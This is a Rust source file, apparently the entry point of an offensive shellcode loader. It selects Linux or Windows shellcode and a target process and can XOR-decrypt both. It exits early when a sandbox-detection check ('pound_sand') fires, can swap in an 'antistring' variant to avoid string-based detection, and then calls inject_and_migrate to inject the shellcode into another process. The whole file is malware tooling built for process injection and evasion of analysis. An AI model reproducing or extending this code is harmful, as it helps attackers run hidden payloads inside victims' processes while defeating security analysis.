use std::str;

// Load Linux implementation if the target OS is Linux
#[cfg(target_os = "linux")]
mod process_migration_linux;
#[cfg(target_os = "linux")]
use process_migration_linux::inject_and_migrate;
// Determine which shellcode and target process to use based on features
#[cfg(all(target_os = "linux", not(feature = "xor")))]
const SHELLCODE: &[u8] = rco_config::LINUX_SHELLCODE;
#[cfg(all(target_os = "linux", not(feature = "xor")))]
const TARGET_PROCESS: &[u8] = rco_config::LINUX_MIGRATION_TARGET.as_bytes();
#[cfg(all(target_os = "linux", feature = "xor"))]
const SHELLCODE: &[u8] = rco_config::ENCRYPTED_LINUX_SHELLCODE;
#[cfg(all(target_os = "linux", feature = "xor"))]
const TARGET_PROCESS: &[u8] = rco_config::ENCRYPTED_LINUX_MIGRATION_TARGET;

// Load Windows implementation if the target OS is Windows
#[cfg(all(windows, not(feature = "antistring")))]
mod process_migration_windows;
#[cfg(all(windows, not(feature = "antistring")))]
use process_migration_windows::inject_and_migrate;
#[cfg(all(windows, feature = "antistring"))]
mod process_migration_windows_antistring;
#[cfg(all(windows, feature = "antistring"))]
use process_migration_windows_antistring::inject_and_migrate;
// Determine which shellcode and target process to use based on features
#[cfg(all(windows, not(feature = "xor")))]
const SHELLCODE: &[u8] = rco_config::WINDOWS_SHELLCODE;
#[cfg(all(windows, not(feature = "xor")))]
const TARGET_PROCESS: &[u8] = rco_config::WINDOWS_MIGRATION_TARGET.as_bytes();
#[cfg(all(windows, feature = "xor"))]
const SHELLCODE: &[u8] = rco_config::ENCRYPTED_WINDOWS_SHELLCODE;
#[cfg(all(windows, feature = "xor"))]
const TARGET_PROCESS: &[u8] = rco_config::ENCRYPTED_WINDOWS_MIGRATION_TARGET;

fn main() {
    // Runs the sandbox detection function or the dummy replacement, dependent on features
    if rco_utils::pound_sand() {
        return;
    }

    // Decrypts the shellcode and target process or returns them unchanged, dependent on features
    let shellcode = rco_utils::xor_encrypt_decrypt(rco_config::XOR_KEY, SHELLCODE).unwrap();
    let target_process =
        rco_utils::xor_encrypt_decrypt(rco_config::XOR_KEY, TARGET_PROCESS).unwrap();
    let target_process = str::from_utf8(&target_process).unwrap();

    // Runs whichever version of the attack was compiled
    inject_and_migrate(&shellcode, target_process);
}
